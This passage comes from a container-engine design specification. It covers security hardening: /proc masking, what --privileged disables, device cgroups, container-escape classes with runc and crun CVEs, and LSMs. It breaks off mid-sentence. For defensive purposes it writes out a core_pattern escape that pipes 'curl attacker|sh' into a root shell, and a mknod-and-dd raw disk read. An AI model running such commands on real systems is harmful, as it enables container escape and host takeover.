procfs uses `get_tree_nodev()` (`fs/proc/root.c`), i.e. a fresh superblock per mount, while the
masks are bind mounts over paths *in one instance*.

**Recommendation.** Therefore masking is **not a boundary against a container that can still
call `mount(2)`**. It counts only when paired with (a) `CAP_SYS_ADMIN` absent from the bounding
set and (b) a seccomp filter denying `mount`/`umount2`/`move_mount`/`fsmount`/`open_tree`/
`mount_setattr` without that capability. Both are already our defaults; the point is to document
them as the enforcement of a **single property** — *the container cannot obtain a writable
`/proc/sys`* — rather than as three unrelated hardening items. §13.7 explains why that property
is the one attackers spend their effort on.

**Fact.** There is a one-flag alternative that is strictly stronger than the 12-path list:
`mount -t proc -o subset=pid` (**Linux 5.8**) hides **all non-process files** in `/proc` —
`kcore`, `keys`, `sched_debug`, `timer_list`, `sys`, the lot — with no bind mounts at all. The
tradeoff is why nobody defaults it: `/proc/meminfo`, `/proc/cpuinfo`, `/proc/stat`,
`/proc/loadavg`, `/proc/mounts` and `/proc/self/mountinfo` disappear too, which breaks every
runtime's container-awareness and every `ps`/`top`/`free`. **Recommendation.** Offer it as
`--proc=minimal` for a hardened profile. It is the kind of thing a from-scratch engine can ship
and a compatible one cannot retrofit.

**Fact.** `hidepid=1`/`hidepid=2` restrict or hide other users' `/proc/<pid>` directories.
**Recommendation.** Low value here: inside a private PID namespace the only visible processes
are the container's own, so `hidepid` separates only different uids *inside the same container*.
Expose it as a mount-option passthrough; do not default it. Docker does not set it.

**Recommendation — implementation requirements that fall out:** mask with the **container's**
`/dev/null` (so `/dev` must be set up first — an ordering dependency), treat `ENOENT` on a masked
path as success, use `mount_setattr(AT_RECURSIVE, MOUNT_ATTR_RDONLY)` on kernels ≥ 5.12 instead
of bind-then-remount (atomic, recursive, and it avoids the "remount didn't apply to submounts"
bug class), and set `nosuid` on `/proc`, `/sys`, `/dev`, `/dev/pts`, `/dev/shm`,
`/sys/fs/cgroup` and every masked or read-only bind. **Trap.** The effective mask set is
host-dependent — `/proc/sched_debug` needs `CONFIG_SCHED_DEBUG`, `/proc/timer_stats` was removed
in 4.11, powercap needs `intel_rapl` — so a security audit diffing the mount table against the
configured list will see "missing" masks that are fine.

### 13.5 `--privileged`, precisely

**Fact.** There is **no kernel "privileged" flag.** It is a bundle of policy defaults turned off
simultaneously, which is exactly why it is dangerous: users reach for it to fix one symptom and
silently disable five unrelated controls.

**Convention.** What `docker run --privileged` changes:

| control | normal | `--privileged` |
|---|---|---|
| capability bounding set | 14 caps | **all** caps |
| seccomp | the default profile | **unconfined** — no filter installed |
| AppArmor | `docker-default (enforce)` | **unconfined** |
| SELinux | `container_t` + a private MCS category | label not applied |
| device cgroup | deny-all + a short allow list | **`a *:* rwm`** |
| `/dev` population | 7 nodes + symlinks | **every host device node** |
| `maskedPaths` | 12+ paths | **empty** |
| `readonlyPaths` | `/proc/{bus,fs,irq,sys,sysrq-trigger}` | **empty — `/proc/sys` is writable** |
| `/sys` | `ro` | **`rw`** |
| `/sys/fs/cgroup` | `ro` | **`rw`** |
| `--pid`/`--net`/`--ipc` | private | *unchanged* — still private unless separately asked |

**Fact — which row is the actual escape vector.** Not the capability set alone, and not
seccomp-unconfined alone: it is the **conjunction of `CAP_SYS_ADMIN` with a writable
`/proc/sys`**, i.e. the `readonlyPaths` row going empty. The shortest escape is two writes and
no exploit:

```sh
# inside a --privileged container
echo '|/bin/sh -c "curl attacker|sh"' > /proc/sys/kernel/core_pattern
# then crash any process; the HOST kernel runs the pipe as host root,
# in the host's namespaces, outside the container.
```

The independent evidence that this is the right identification: **three of the five
2025–2026 runc/crun container-escape CVEs are escapes by *non-privileged* containers, and every
one of them works by obtaining a writable `/proc/sys/kernel/core_pattern` or
`/proc/sysrq-trigger`** (§13.7). Attackers are not after capabilities; they are after that one
file. `--privileged` hands it over directly.

**Recommendation.** Implement `--privileged` as a single function that sets the same eleven
fields, so the bundle is visible in one place and cannot drift. **Warn every time it is used,
naming what was disabled — including the list of masked paths that were un-masked**, which is
the row users never think about — and suggest the narrower flag, because most real uses need
exactly one of `--device`, `--cap-add`, `--security-opt seccomp=unconfined`,
`--security-opt apparmor=unconfined`, or `--unmask=<path>`. Do **not** invent a
"semi-privileged" mode; the decomposed flags already cover it and a fourth thing to reason about
is a liability.

### 13.6 Devices

**Fact.** cgroup v2 has no `devices` controller (§12.6). Device access is a
`BPF_PROG_TYPE_CGROUP_DEVICE` program receiving
`struct bpf_cgroup_dev_ctx { access_type = (access << 16) | dev_type, major, minor }`
(`torvalds/linux@v6.17/kernel/bpf/cgroup.c#L1737-L1755`) and returning 1 or 0. The `access` bits
include a distinct **`m` (mknod)** bit alongside `r` and `w`.

**Fact — the device controller does not gate `mknod` the way one would assume.** runc's
`AllowedDevices` (`runc@v1.2.5/libcontainer/specconv/spec_linux.go#L185-L201`) unconditionally
includes:

```
c *:*    m     ALLOW     <-- mknod for ANY char device
b *:*    m     ALLOW     <-- mknod for ANY block device
c 1:3 / 1:5 / 1:7 / 1:8 / 1:9 / 5:0 / 5:2 / 136:* / 10:200   rwm ALLOW
```

and these are **appended after the user's rules**, so they cannot be disabled — a
`--device-cgroup-rule` denying them has no effect. runc's own comment is unusually candid:
*"This behaviour is at the very least 'questionable' (if not outright wrong) according to the
runtime-spec … several devices listed here are not part of the spec (including 'mknod for any
device'?!) … I'm too scared to change this now because who knows how many people depend on this
(incorrect and arguably insecure) behaviour."*

**Trap.** So inside a default Docker container, `mknod /tmp/x b 253 0` **succeeds** — the BPF
program returns 1 for every `mknod` of any major/minor. The step that is actually blocked is the
subsequent **`open()`** for read or write, because `b *:*` is allowed only for `m`. The common
claim that "the device cgroup blocks this" names the wrong step; the correct statement is that
two independent controls block the *open*: the BPF program, and `MS_NODEV` on the filesystem.
(This also resolves the `/dev/full` puzzle: `c 1:7` is in runc's list, not Docker's.)

**Fact.** `MS_NODEV` makes device nodes on a filesystem inert — opening a char or block node
returns `EACCES` regardless of mode. **Recommendation.** `nodev` on every mount we create except
`/dev` and `/dev/pts`, and on every user-supplied volume unless explicitly overridden. Without
it, `CAP_MKNOD` plus a writable volume is raw disk access:
`mknod /vol/disk b 253 0 && dd if=/vol/disk` reads the host filesystem directly, bypassing every
path-based control. Also `nosuid` everywhere, and `noexec` on `/dev` and `/dev/shm` with an
opt-out — Docker leaves `/dev` executable, which is a small well-known gap it accepts because
some images use `/dev/shm` for JIT scratch.

**Recommendation — the deliberate choice this forces.** Three options, and picking by accident
is the failure: (a) copy runc's `c *:* m` / `b *:* m` for bug-compatibility and rely on
`CAP_MKNOD` plus `nodev`; (b) deny `mknod` by default and provide `--device-cgroup-rule` to
re-allow; (c) deny `mknod` **and** drop `CAP_MKNOD` from the default set, which makes the
question moot. **(c)** is coherent — it is the one place where dropping `CAP_MKNOD` (§13.1) and
the device analysis reinforce each other instead of each assuming the other holds.

**Recommendation.** Bind-mount device nodes unconditionally rather than branching on
`CAP_MKNOD`. It is the one mechanism that works in both privilege modes, so there is one code
path instead of two; the ownership difference is invisible because the BPF program, not the file
mode, is the access control. It also avoids the `/dev`-symlink class entirely when the source is
an fd obtained before `pivot_root`.

**Fact.** **A fresh `tmpfs` on `/dev` before any device setup is a security requirement with CVE
evidence, not a tidiness convention.** Both 2026 crun advisories (CVE-2026-88264,
CVE-2026-88265 — rootfs-controlled `/dev/console` and `/dev/null` symlinks followed during
device setup and stdio reopening, yielding root-owned file creation outside the rootfs) name the
mitigating condition explicitly: *"Default configurations generated by Docker, Podman,
containerd, CRI-O, and `crun spec` mount a fresh tmpfs on `/dev`, so they are not affected."*

**Fact.** `bpf(BPF_PROG_LOAD)` for `BPF_PROG_TYPE_CGROUP_DEVICE` and `BPF_PROG_ATTACH` need
`CAP_BPF` + `CAP_SYS_ADMIN` (before 5.8, `CAP_SYS_ADMIN`), so **a rootless container cannot have
a device cgroup at all** — and on hosts with `kernel.unprivileged_bpf_disabled = 1` the setting
is permanent until reboot. **Recommendation.** In rootless mode, skip the program, rely on
`/dev` being a tmpfs we populate (a rootless container cannot `mknod` a real device anyway,
§14.1), and say so in `info`.

**Fact — the scale of the program, which bears on how it should be built.** runc's attached
`cgroup_device` program is **552 bytes xlated** (about 69 eBPF instructions for a 7-rule policy)
with no map, no helper call, no relocation, no BTF and no CO-RE. It loads `access_type`, `major`
and `minor` from the context, compares against a rule list, and returns 1 or 0.

### 13.7 Escape classes — the general rule first, the CVEs as instances

A CVE list is unusable guidance: it tells you what was fixed, not what to build. What follows is
five classes, each with the structural property of our design that closes it. The CVEs are
evidence that the class is real and recurrent, not the unit of defence.

#### Class 1 — the runtime names a path the container can influence

**The rule.** *The runtime never names a path the container can influence, for any operation,
including its own `/proc` writes and its own masking mounts. Every such operation goes through
an fd obtained before the container could interfere, or through
`openat2(dirfd, path, RESOLVE_IN_ROOT | RESOLVE_NO_SYMLINKS | RESOLVE_NO_MAGICLINKS)`, and is
verified by `fstat`/`fstatfs` against the expected object before use.* Two corollaries:
**apply masking before any bind whose destination comes from the rootfs**, and **mount a fresh
tmpfs on `/dev` before any device setup**.

**Fact — the kernel primitive.** `openat2(2)` (**Linux 5.6**) takes `struct open_how.resolve`:
`RESOLVE_BENEATH` (every component beneath `dirfd`; absolute paths and `..` escapes fail
`EXDEV`), `RESOLVE_IN_ROOT` (treat `dirfd` as `/` — chroot semantics for one open, done in the
kernel, atomically), `RESOLVE_NO_SYMLINKS`, `RESOLVE_NO_MAGICLINKS` (blocks `/proc/self/fd/N`
traversal), `RESOLVE_NO_XDEV`. `MS_NOSYMFOLLOW` (5.10) on container-writable mounts is a cheap
extra layer. Below 5.6 this has to be hand-rolled as a component-at-a-time resolver with `..`
bookkeeping — about 300 lines of subtle code, and a concrete reason the floor sits where it does.

**Instances.** Six years of the same bug:

| CVE | what it was |
|---|---|
| CVE-2016-9962 and the `securejoin` lineage | the runtime `stat`s `<rootfs>/etc/hosts`, decides it is a regular file, then binds onto it — and in between the container replaced `etc` with a symlink to `/` |
| **CVE-2025-31133** (runc ≤1.2.7/1.3.2, high) | **the masking mechanism itself is the vector.** runc masks files by binding the container's own `/dev/null` over them and never verified the source is a real `/dev/null` inode. Replace it with a symlink and runc binds an arbitrary source — e.g. a writable `/proc/sys/kernel/core_pattern` ⇒ host root, or `/proc/sysrq-trigger` ⇒ host panic. Reachable from a plain `buildx build` via shared mounts between parallel containers |
| **CVE-2025-52881** (runc, high) | **all of runc's writes under `/proc` are redirectable** by a racing container with shared mounts. Generalises past the older "is it a procfs file" fix by redirecting to a *real but harmless* procfs file, so LSM labels silently do not apply — and turns the sysctl writer into a write gadget aimed at `core_pattern` |
| **CVE-2025-52565** (runc, high) | the `/dev/pts/$n` → `/dev/console` bind runs **before** `maskedPaths`/`readonlyPaths` are applied and the destination is unverified. **The root cause is an ordering bug**, which is why the ordering is part of the rule |
| **CVE-2026-88264 / CVE-2026-88265** (crun ≤1.25) | rootfs-controlled `/dev/console` and `/dev/null` symlinks followed during device setup and stdio reopening |
| **CVE-2026-41567 / CVE-2026-42306** (moby ≤28.x, high) | `PUT /containers/{id}/archive` executes a container binary on the host; and a `docker cp` race redirects a bind mount to a host path |

**Our structural property.** The rootfs is opened once at creation and kept as a `dirfd`; every
container-side path is resolved through `openat2` against it and then operated on via the
resulting fd or `*at` syscalls, never re-resolved by path. The `/dev/null` used for masking is an
fd opened from the host's devtmpfs **before** `pivot_root` and verified `S_ISCHR` with
`st_rdev == makedev(1,3)`. Writes under `/proc` go to an fd verified by `fstatfs` ==
`PROC_SUPER_MAGIC` and `fstat` against the expected inode — a stricter rule than "do not
concatenate rootfs paths", because `/proc` paths are not rootfs paths and were the gap in every
2025 CVE above.

#### Class 2 — host-privileged code executes inside the container's view

**The rule.** *No host-privileged binary is reachable by path from inside the container, and no
host-privileged process resolves anything dynamically — libraries, NSS entries, hostnames —
while inside the container's filesystem view.*

**Instances.** **CVE-2019-5736**: runc's container init was reached by executing
`/proc/self/exe`, a magic symlink to the running host runc binary. A container that got that
process to `execve` a file it controlled could then `open("/proc/<pid>/exe", O_WRONLY)` — which
fails `ETXTBSY` while the binary executes, so the exploit holds the fd, waits for runc to exit,
and overwrites the host's runc. **CVE-2019-14271**: `docker cp`'s helper `chroot`ed into the
container's filesystem and, being dynamically linked, then resolved `libnss_*.so` from the
*container's* `/lib`; a hostile image got its code executed by a host-root process outside any
isolation. The 2026 moby archive CVE is the same class recurring seven years later.

**Convention.** runc's fix is to re-exec a copy of itself sealed in a `memfd_create(2)` object
with `F_SEAL_WRITE`/`F_SEAL_SHRINK`/`F_SEAL_GROW`/`F_SEAL_SEAL`, so there is nothing to
overwrite.

**Our structural property — this one deletes the class rather than sealing it.** Our container
init is a `fork`ed child of the daemon that never `execve`s anything except the **user's**
entrypoint, so there is no host-privileged binary in the container's view at any point. runc
must re-exec because Go cannot safely `unshare(CLONE_NEWUSER)` on a live multi-threaded runtime,
which is what forces the `nsenter` C-constructor dance; in Rust we control threading, so a
single-threaded pre-exec child is feasible. The same constraint arrives independently from
seccomp TSYNC, from `unshare` semantics, and from post-`clone` async-signal-safety — four
mechanisms converging on one design, which is why it belongs in the spec as a constraint rather
than a preference. Secondary rules: resolve the entrypoint by path, never via `/proc/self/exe`;
never call `getpwnam`/`getgrnam`/`getaddrinfo` from code running in the container's filesystem
view — parse the container's `/etc/passwd` ourselves, which we want anyway because `USER app`
must be resolved against the *container's* passwd; and implement `cp` as an fd-based operation
from outside rather than by entering the container.

#### Class 3 — file descriptors leaked across `execve`

**The rule.** *Every fd is `O_CLOEXEC` at creation — not `FD_CLOEXEC` afterwards, which is a
race window if we fork in between — and `close_range(3, ~0u, CLOSE_RANGE_CLOEXEC)` runs
immediately before `execve`.*

**Instance.** **CVE-2024-21626** (runc 1.0.0-rc93 → 1.1.11, fixed 1.1.12, CVSS 8.6), verbatim on
the cause: *"several file descriptors were inadvertently leaked internally within runc into
`runc init`, including a handle to the host's `/sys/fs/cgroup`"*. Four variants: `process.cwd =
/proc/self/fd/7/` makes the container's working directory the host's `/sys/fs/cgroup` dirfd;
`runc exec --cwd` through a container-replaced symlink; `process.args =
/proc/self/fd/7/../../../bin/bash` to overwrite host binaries; and overwrite-then-read
`/proc/$pid/exe`.

**Our structural property.** In Rust most of this is free — `std::fs::File` sets `O_CLOEXEC`,
`std::net` sets `SOCK_CLOEXEC` — and the danger is precisely at the raw-syscall boundary, which
is most of this engine. A wrapper type that makes a non-`CLOEXEC` open impossible is worth its
small cost. `close_range` is 5.9 with `CLOSE_RANGE_CLOEXEC` at **5.11** (it marks rather than
closes, which is safer if we still need an fd); the fallback is iterating `/proc/self/fd`, never
a blind `for fd in 3..1024` loop, which both misses high fds and closes fds we did not open.
Both `process.cwd` **and** `process.args[0]` are resolved inside the rootfs with
`openat2(RESOLVE_IN_ROOT|RESOLVE_NO_MAGICLINKS)` — variant 3 used `args`, not `cwd` — and
`RESOLVE_NO_MAGICLINKS` makes the `/proc/self/fd/7` shape impossible by construction, as a second
defence independent of the `O_CLOEXEC` one.

#### Class 4 — non-namespaced kernel upcall interfaces

**The rule.** *The container never obtains a writable `/proc/sys` or `/sys`, and never sees
cgroup v1 — and the engine treats that as one property with three enforcements rather than three
hardening items.*

**Fact.** Several kernel interfaces execute a userspace program **as root in the initial
namespaces**, and none of them is namespaced: `kernel.core_pattern` (on a core dump),
`/sys/kernel/uevent_helper`, `kernel.modprobe`, and — on cgroup v1 only — a hierarchy root's
`release_agent` when a cgroup with `notify_on_release=1` empties.

**Instance.** **CVE-2022-0492**: `cgroup_release_agent_write()` checked only file write
permission, not `CAP_SYS_ADMIN` **in the initial user namespace**. The chain is instructive
about which defences matter: a container running as root but without host `CAP_SYS_ADMIN`
`unshare(CLONE_NEWUSER|CLONE_NEWNS)`s to obtain a full capability set *in the new namespace*,
mounts a cgroup **v1** hierarchy (the writeups name `rdma`, because containers sit at the *root*
of that hierarchy and `release_agent` exists only at the root), writes a script path to
`release_agent`, and lets a child cgroup empty. The script runs as host root.

**Our structural property.** cgroup v2 only, mounted `ro` — and v2's immunity is structural, not
luck: `release_agent` and `notify_on_release` were **deleted** from v2
(`torvalds/linux@v6.17/kernel/cgroup/cgroup.c#L330`), with the field surviving only on
`struct cgroup_root` for cgroup1 mounts. `/proc/sys` and `/sys` read-only, enforced by the
conjunction §13.4 names: `CAP_SYS_ADMIN` absent from the bounding set, and seccomp denying the
mount family without it. **The masking policy is not hardening — it is *the* control**, because
it is the thing CVE authors spend their effort defeating.

#### Class 5 — the kernel's own permission check is missing

**The rule.** *Duplicate, in seccomp, the capability gate the kernel already applies — because
the kernel's check is sometimes the bug.*

**Instance.** CVE-2022-0492 again, from the other side. Its published mitigation matrix reads
*"Containers running with AppArmor, SELinux or Seccomp are protected"*: being vulnerable
required running as root, **no** AppArmor/SELinux, **no** seccomp, unprivileged userns enabled
on the host, and the container at the root of some v1 hierarchy. Any single mitigation blocked
it — seccomp because it gates `unshare`/`mount` on `CAP_SYS_ADMIN`, AppArmor because
`docker-default` denies `mount` outright.

**Our structural property.** Docker's capability-gated seccomp rules (§13.2) are carried over
deliberately and documented as defence in depth against a kernel capability-check bug, not as
redundancy to be optimised away by someone who notices the kernel already checks.

**Recommendation — the cheap half of the list.** Five mechanisms close the five items most often
skipped, and together they are a handful of lines: `mount(NULL, "/", NULL, MS_REC|MS_PRIVATE,
NULL)` (or `MS_SLAVE`) before any mount, so nothing propagates to the host;
`O_CLOEXEC` everywhere; `nosuid,nodev` on every mount we create; one `prctl` for
`no_new_privs`; and one file write for a default `pids.max`. Skipping them is what separates an
educational container from an unsafe one.

**Trap — on mount propagation, because the usual justification is wrong.** The reason to make
`/` recursively `MS_SLAVE` is *not* primarily "otherwise the container's own mounts leak to the
host". A bind of a private mount is private and its children propagate nowhere
(`clone_mnt`, `torvalds/linux@v6.11/fs/namespace.c#L1320-L1334`), so making the rootfs's parent
private already covers the container's own mount set. The real reasons are: (1) a bind taken
from a *shared* host mount is itself shared regardless of how private its destination is, so
without it every `-v /host/x:/ctr/x` volume is a two-way channel; (2) `umount2(…, MNT_DETACH)`
**propagates** (`do_umount`, `fs/namespace.c#L1914-L1917`, `umount_tree(…, UMOUNT_PROPAGATE)`),
so detaching the old root after `pivot_root` can push umount events into the host's mount
namespace — destructive, not cosmetic; and (3) it is the knob the OCI `linux.rootfsPropagation`
field maps onto. A reader who derives from the leak story will conclude the step is optional once
the rootfs parent is private, and will then ship volumes that propagate.

### 13.8 LSMs

**Convention — what AppArmor's `docker-default` adds beyond capabilities and seccomp.** It is a
deliberately loose profile (it must run arbitrary images) whose substance is a small deny list:
`deny @{PROC}/* w` and `deny @{PROC}/sys/[^k]** w`; `deny @{PROC}/sysrq-trigger rwklx`;
`deny @{PROC}/kcore rwklx`; **`deny mount`** unconditionally; writes under `/sys` denied except a
narrow `/sys/fs/cgroup` read path; `/sys/firmware` and `/sys/kernel/security` denied;
`ptrace (trace,read,tracedby,readby) peer=docker-default`;
`signal (receive,send) peer=docker-default`. Everything else is allowed, with the kernel's own
capability check still applying. Docker generates it from a template at daemon start and loads it
via `apparmor_parser` without writing a permanent file.

**Recommendation — the value is precisely what capabilities and seccomp *cannot* express.**
`deny mount` is **path-and-operation based**, which seccomp structurally cannot do (§13.2, no
pointer dereference): seccomp can only block `mount(2)` wholesale or by flags. That is the
control that independently defeated CVE-2022-0492 — and, by inspection, would have contained
CVE-2025-31133 and CVE-2025-52565, both of which are a runtime being tricked into mounting.
`deny @{PROC}/sys/** w` is a second, independent layer over §13.4's read-only binds, i.e.
defence in depth against *our own* bugs. And `peer=` confines ptrace and signals across
containers, which namespaces give you only via separate PID namespaces. All of it is enforced by
the kernel regardless of the container's uid, so it holds even when the container is host-root.

**Fact — SELinux.** Type enforcement puts container processes in `container_t` and container
files in `container_file_t`, so the process cannot read `etc_t` or `shadow_t` host files
regardless of uid or capabilities. On top, **MCS** gives each container a unique category pair
(`s0:c412,c910`) applied to both process and files, so two containers cannot touch each other's
files *even though both are `container_file_t`* — a genuinely stronger container-to-container
property than AppArmor's `docker-default` provides. A bind-mounted host directory keeps its host
type, which `container_t` cannot access, producing a "Permission denied" that looks like an
ownership problem and is not; `:z` relabels to the shared level, `:Z` to this container's private
category. **Trap.** `:Z` on `/home/user` or `/var/lib/mysql` makes it inaccessible to the host
and to every other container, and on a large tree it is a recursive `setfattr` storm.

**Fact — the `no_new_privs` interaction, settled from source.** A domain transition that
*reduces* confinement is permitted under `no_new_privs`:
`torvalds/linux@v6.17/security/apparmor/domain.c#L978-L992` refuses only when the task was
already confined and the new label is not a subset:

```c
if ((bprm->unsafe & LSM_UNSAFE_NO_NEW_PRIVS) &&
    !unconfined(label) &&
    !aa_label_is_unconfined_subset(new, ctx->nnp)) {
        error = -EPERM;
        info = "no new privs";
```

**Trap — the deployment hazard this implies.** `ctx->nnp` records the label *at the time
`no_new_privs` was set*. If our own daemon is confined — e.g. shipped with a systemd unit
carrying `AppArmorProfile=`, which is increasingly normal on Ubuntu — then our container init is
confined at that moment, and the transition to the container profile is permitted **only if it is
a subset of the daemon's profile**. A daemon profile narrower in any dimension makes every
container transition fail with `EPERM` and the audit reason `"no new privs"`.
**Recommendation.** Either ship no daemon profile, ship one that is a strict superset of the
container profile, or apply the container profile **before** setting `no_new_privs` — which is
what runc does, and which is why §13.1's sequence puts the LSM label at step 10 and
`no_new_privs` at step 11.

**Fact — Landlock, and why it belongs in our design where the other two may not.** Landlock
(**Linux 5.13**) is a **stackable** LSM: it composes with AppArmor and SELinux rather than
competing for the single major-LSM slot, so enabling it never conflicts with the host's policy.
`landlock_restrict_self(2)` fails with `EPERM` only if *"the calling thread is not running with
`no_new_privs`, or it doesn't have `CAP_SYS_ADMIN` in its user namespace"* — and we set
`no_new_privs` by default, so the precondition is already met. **It needs no privilege and no
host configuration**: no profile loaded into the kernel by root, no policy package installed. It
is self-restriction, inherited by all future children, narrowing only (max 64 composed rulesets,
`E2BIG` beyond). And its capability level is **probed, not version-sniffed**:
`landlock_create_ruleset(NULL, 0, LANDLOCK_CREATE_RULESET_VERSION)` returns the ABI number
(`ENOSYS` = unsupported, `EOPNOTSUPP` = compiled in but disabled at boot). ABI progression: v1
filesystem rights; v2 `FS_REFER`; v3 `FS_TRUNCATE`; v4 `NET_BIND_TCP`/`NET_CONNECT_TCP`; v5
`FS_IOCTL_DEV`; v6 `SCOPE_ABSTRACT_UNIX_SOCKET` and `SCOPE_SIGNAL`; v7 audit control.

| | AppArmor | SELinux | Landlock |
|---|---|---|---|
| needs root to install policy | **yes** (`apparmor_parser`, `CAP_MAC_ADMIN`) | **yes** (policy package) | **no** |
| works rootless | **no** — the transition silently yields `unconfined` | no | **yes** |
| works on any distro with no host config | no | no | **yes** |
| can deny `mount` | **yes** | yes | **no** |
| cross-container ptrace/signal confinement | yes (`peer=`) | yes (MCS) | partial (v6, same-domain only) |
| per-container policy without a policy compiler | no | no | **yes** — a struct and three syscalls |

**Recommendation — the staged plan.** *Now:* carry `apparmor_profile: Option<String>`,
`selinux_label: Option<String>` and a Landlock ruleset option in the container config (OCI
already has `process.apparmorProfile` and `process.selinuxLabel`), and **apply them if set**.
Applying is small: AppArmor is one write to `/proc/self/attr/apparmor/exec` (or `.../attr/exec`
on older kernels) before `execve`; SELinux is one write to `/proc/self/attr/exec`; Landlock is
three syscalls and no dependency. ~20 lines, and it means a user with a hand-written profile can
use it. *Next:* ship an AppArmor profile equivalent to `docker-default` and load it at daemon
start with `apparmor_parser -Kr`, gated on `/sys/module/apparmor/parameters/enabled` reading `Y`
— a data file plus a subprocess call. *Defer indefinitely:* SELinux MCS category allocation,
which needs `libselinux` bindings, category bookkeeping and volume relabelling, and matters only
on RHEL-family hosts.

**Recommendation.** Landlock is the lowest-urgency of the three to *build* and the highest to
*record*, because it is the only one a rootless engine can use at all and it closes the one
*quiet* failure in §14.3's table. Detect by probe, never by distribution: AppArmor from
`/sys/module/apparmor/parameters/enabled`, SELinux from `/sys/fs/selinux` being a mounted
`selinuxfs`, the enabled list from `/sys/kernel/security/lsm`, Landlock from its ABI call.

### 13.9 Process isolation versus security isolation

**Fact — the distinction, drawn on mechanism.**

- **Process isolation** means the container cannot *see or accidentally interfere with* the host
  and other containers. Mechanisms: PID, mount, network, IPC and UTS namespaces; a separate
  rootfs; cgroup accounting. The threat model is **mistakes**.
- **Security isolation** means the container cannot *escalate to host privilege while actively
  trying*. Mechanisms: a user namespace or a non-root uid; a capability bounding set; a seccomp
  filter; an LSM profile; masked and read-only `/proc` and `/sys`; a device program; no leaked
  fds; resource limits.

**Fact — the correct taxonomy, because the obvious tabulation is wrong.** It is tempting to
assign namespaces to the first column and everything else to the second. That mis-ranks
`--pid=host` and `--net=host`, both of which are escalation paths. The accurate statement:
**namespaces are necessary preconditions, never sufficient, and never controls by themselves.**
Each one is a precondition for specific security controls — the mount namespace is where masking
and read-only binds exist at all; the PID namespace is what puts `/proc/<host-pid>/root` and
every other process's magic links out of reach; the network namespace is what makes
host-local services, including our own API socket on `127.0.0.1` and the cloud metadata endpoint
at `169.254.169.254`, unreachable. The *controls* are the things that still hold when the
container is attacking: user namespace, bounding set, seccomp, LSM, `/proc`–`/sys` policy,
device program, no leaked fds, and resource limits (availability is a security property; a fork
bomb that stops the host accepting logins needs no exploit).

**Fact — the worked example, and it has since been independently validated.** Take a container
that is *fully* process-isolated:
`clone(CLONE_NEWPID|CLONE_NEWNS|CLONE_NEWNET|CLONE_NEWIPC|CLONE_NEWUTS)`, `pivot_root` into an
extracted image, a fresh `proc`, a fresh `sysfs`, a fresh `/dev`, and a cgroup with
`memory.max` and `pids.max` set. `ps` shows one process, `ip addr` shows one interface, `df`
shows the image. By any reasonable definition of "container", it works. It is escapable in one
command:

```sh
echo '|/bin/sh -c "…"' > /proc/sys/kernel/core_pattern
```

because the container runs as uid 0, uid 0 is host uid 0 with no user namespace, so it holds
`CAP_SYS_ADMIN`; `/proc/sys` was mounted fresh and is writable; `kernel.core_pattern` is not
namespaced; and the kernel runs the pipe program as host root in the initial namespaces. Every
namespace worked perfectly. Not one of them was a control against this. The validation: three of
the five 2025–2026 runc/crun escapes (§13.7) are escapes by fully namespace-isolated containers,
and every one of them terminates at that exact file.

**Recommendation — where the MVP honestly sits, stated without the comfortable comparison.** An
MVP that ships namespaces, `pivot_root`, a correct mount set and cgroup limits, but defers
capabilities, seccomp and an LSM, has **process isolation only**. It is not "no worse than
Docker". Docker's permissive default — no user namespace, root in the container is root on the
host — is survivable *only because* capabilities, seccomp and AppArmor are all present and all
enforcing simultaneously; the published CVE-2022-0492 mitigation matrix is the direct evidence,
since any one of the three sufficed and the vulnerable configuration required all three absent.
An MVP that defers all three is in a structurally different position from Docker, not a slightly
weaker one.

**Recommendation.** Say so in the engine's own output. An MVP build should print, at container
start, which of the security controls are active and which are not — and a build with none of
them should refuse to run without an explicit flag. The alternative is a tool that looks like
Docker, is used like Docker, and is not defended like Docker.

### What this decides

| decision | urgency |
|---|---|
| Capability ordering: **drop the bounding set while euid is still 0**, then `KEEPCAPS` → ids → `capset` → ambient; clear inheritable first | **urgent** — the natural ordering is wrong and fails only for non-root containers |
| `no_new_privs` on by default; `allow-new-privileges` explicitly documented as "install seccomp early, while privileged", so the second branch does not reappear by accident | **urgent** — it determines the number of code paths in the init sequence |
| Native-architecture-only seccomp rules, arch check as instruction 1, deny unknown arch and any `nr` with bit 30 set | **urgent** — the failure mode is a silent total bypass |
| `ENOSYS`-above-max as a first-class filter feature, threshold from the **kernel's** syscall table, not our profile's maximum | **urgent** — gets it right where runc had to patch |
| Adopt Docker's profile as the default, plus the capability-gated duplication as deliberate defence in depth | deferrable but do not redesign it |
| User namespace with a real mapping from the start, even as root; parent writes the map before the child `execve`s; disambiguate the three `EPERM`s including the 5.12 `CAP_SETFCAP` rule | **urgent** — it is the expensive retrofit (§14.4) |
| `Option<IdMapping>` on every mount call from day one | **urgent** — retrofitting changes the syscall sequence, not an argument |
| Masking paired explicitly with `CAP_SYS_ADMIN` dropped + seccomp `mount` gate, documented as one property; Docker's mask list, not `runc spec`'s | **urgent** — masks are per-superblock and worthless alone |
| Devices: bind-mount nodes unconditionally, fresh tmpfs on `/dev` first, and the deliberate choice to deny `mknod` **and** drop `CAP_MKNOD` | deferrable, but pick it rather than inherit it |
| Hand-assembled eBPF device program; no BPF crate | deferrable |
| LSM stage 0 now (two `Option<String>` fields, two writes, correctly ordered before `no_new_privs`) plus a Landlock option | deferrable, ~20 lines |
| MVP posture declared at runtime, and a build with no security controls refuses to run unflagged | **urgent** — it is a product decision, not a code one |

---

## 14. Rootless containers

The project is root-first. This section exists for two reasons: a surprising amount of the
rootless path works today and should not be designed around as if it did not, and a small number
of root assumptions are expensive enough to retrofit that they must be decided now. The failure
*mode* matters more than the failure — a loud failure is a support question, a quiet one is a
security incident three weeks later — so the material is organised by how it fails, not by
feature.

### 14.1 What actually works

**Fact — user namespace creation and the capability set.** Measured on Rocky Linux 8.8, kernel
`4.18.0-425.3.1.el8`, as an unprivileged user: `unshare -Ur` yields uid 0 inside the namespace
with `CapEff = CapPrm = CapBnd = 0x000001ffffffffff` — all 41 capabilities, bounded to objects
the namespace owns (§13.1).

**Fact — single-ID mapping needs no helper and no intermediate process.** A process that has
just `unshare(CLONE_NEWUSER)`d may write its own `uid_map` when the map is a single extent of
length 1 mapping its own euid (`torvalds/linux@v6.11/kernel/user_namespace.c#L1163`, §13.3).
That is exactly what `unshare --map-root-user` and `podman unshare` do. **Trap.** The widespread
belief that a child can never map itself — and that user-namespace support therefore forces a
three-process topology — is false. Multi-extent `/etc/subuid` maps need a privileged writer;
single-ID maps do not. There is a real rung between "root MVP" and "full subuid rootless" that
costs no new process topology.

**Fact — the full bridge-and-NAT model is constructible inside a rootless namespace, on a 4.18
